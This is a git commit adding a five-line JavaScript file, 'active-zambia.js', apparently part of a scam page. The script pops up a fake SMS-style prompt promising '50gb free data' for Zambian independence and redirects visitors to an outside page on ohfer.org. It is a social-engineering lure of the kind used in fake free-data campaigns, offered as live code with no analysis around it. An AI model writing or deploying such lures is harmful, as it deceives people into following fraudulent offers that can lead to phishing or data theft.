ea94d3c345743dd7dd7118f784ceb3a2122b390b
ekpanewblog5 <ukpehaitid3@gmail.com>
2025-10-07 08:23:03 +0100

    Create active-zambia.js

---
+++ active-zambia.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Happy Independence, your mobile number is eligible to receive 50gb free data, click OK to activate now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://ohfer.org/zambia.html';
+}
